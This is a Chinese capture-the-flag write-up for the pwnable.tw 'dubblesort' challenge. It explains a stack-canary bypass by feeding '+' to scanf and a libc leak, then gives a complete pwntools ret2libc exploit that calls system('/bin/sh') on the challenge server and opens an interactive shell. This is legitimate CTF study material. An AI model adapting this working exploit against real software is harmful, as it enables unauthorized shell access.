
## Canary 绕过思路

得到`libc`基地址就可以计算出`system`函数以及'`/bin/sh`'字符串所在的地址,现在目标地址以及有了,只需要控制`eip`就可以了.这个溢出也很简单,只要用`scanf`覆盖返回地址就可以了,但这个题最难搞定的点就在这里,他开了`Canary`检测,如果我们想要覆盖返回地址,那就会覆盖`Canary`,导致溢出失败,所以要先想办法解决`Canary`.

我最先想到的是非法输入,`scanf`读取的是一个`%u`,我们随便输一个字符,但是读取数字的这个循环只对`stdout`进行了清空,而没有对输入进行清空,所以这个非法输入会导致后面的输入也全都无效,自然不能覆盖返回地址.

```
//非法输入的结果

[0] % ./dubblesort

What your name :0x2l

Hello 0x2l,How many numbers do you what to sort :10

Enter the 0 number : 1

Enter the 1 number : 2

Enter the 2 number : 3

Enter the 3 number : 4

Enter the 4 number : 5

Enter the 5 number : fuck

Enter the 6 number : Enter the 7 number : Enter the 8 number : Enter the 9 number : Processing......

Result :

0 1 2 3 4 5 1815246896 4160405504 4292118532 4292118538 %
```

那有没有一个既合法又不会改变数值的输入呢?有,那就是'+'和'-'.这两个符号可以定义正负,所以会被识别为合法输入,但是仅凭一个加号或者减号`scanf`又无法获得有效数值,所以这次输入是"合法且无效的",正好满足我们对`Canary`所在地址的操作.和非法输入不同的是,上一次无效的`scanf`并不会影响接下来的`scanf`,`scanf`识别不到有效数据的话会继续中断等待我们的输入.这样,我们可以肆意修改栈上的数据,只要在`Canary`地址处输入一个'+'来跳过他.

## Payload 构建

现在所有需要的东西都已经具备了,可以开始构建我们的payload了.

先看一下程序开头那一堆变量:

```
int eax_number_count;         // eax

int *number_buf_ptr;             // edi

unsigned int index;             // esi

unsigned int index_1;         // esi

int result;                     // eax

unsigned int number_count;     // [esp+18h] [ebp-74h]

int number_buf;                 // [esp+1Ch] [ebp-70h]

char name_buf;                 // [esp+3Ch] [ebp-50h]

unsigned int canary;             // [esp+7Ch] [ebp-10h]
```

`number_buf`就是我们保存输入数字的地方,而`canary`的相对偏移为`0x60`,`canary`相对返回地址的偏移为`0x1c`.返回地址之后我们还需要再填充一个返回地址(随便写)和'`/bin/sh`'的地址作为参数.

## Exp

```
# -*- coding: utf-8 -*-

from PwnContext.core import *

local = False

# Set up pwntools for the correct architecture

exe = './' + 'dubblesort'

elf = context.binary = ELF(exe)

ctx.custom_lib_dir = '/home/dylan/glibc-all-in-one/libs/2.23-0ubuntu10_i386'

#don't forget to change it

host = args.HOST or 'chall.pwnable.tw'

port = int(args.PORT or 10101)

#don't forget to change it

#ctx.binary = './' + 'dubblesort'

ctx.binary = exe

libc = args.LIBC or 'libc.so.6'

elf_libc = ELF(libc)

ctx.debug_remote_libc = True

ctx.remote_libc = libc

if local:

    context.log_level = 'debug'

    try:

        io = ctx.start()

    except Exception as e:

        print(e.args)

        print("It can't work,may be it can't load the remote libc!")

        print("It will load the local process")

        io = process(exe)

else:

    io = remote(host,port)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# Arch:     i386-32-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
# FORTIFY:  Enabled

def exp():

    # leak libc_base

    io.sendline('a' * 24) # sendline will send a '\n' to cover 0x00

    io.recvuntil('a' * 24)

    libc_base = (u32(io.recvn(4)) & 0xffffff00) - 0x001b0000

    log.success('libc_base = ' + hex(libc_base))

    system_off = elf_libc.symbols['system']

    log.success('system_addr = ' + hex(libc_base+system_off))

    bin_sh_off = next(elf_libc.search('/bin/sh\0'))

    log.success('bin_sh_addr = ' + hex(libc_base+bin_sh_off))

    # stack overflow

    io.sendline(str(35))    # number_count

    for i in range(24):     # junk

        io.sendlineafter('number : ', str(1))

    io.sendlineafter('number : ', '+') # canary

    for i in range(9):      

        io.sendlineafter('number : ', str(libc_base+system_off))    # return address

    io.sendlineafter('number : ', str(libc_base+bin_sh_off))    # /bin/sh

if __name__ == '__main__':

    exp()

    io.interactive()
```

## 关于我

博客有我的联系方式,欢迎大家来玩,地址:620K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3f1H3P5o6u0D9i4K6u0W2j5$3^5`.

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)

最后于 2020-8-12 20:23

被0x2l编辑，原因： 修改
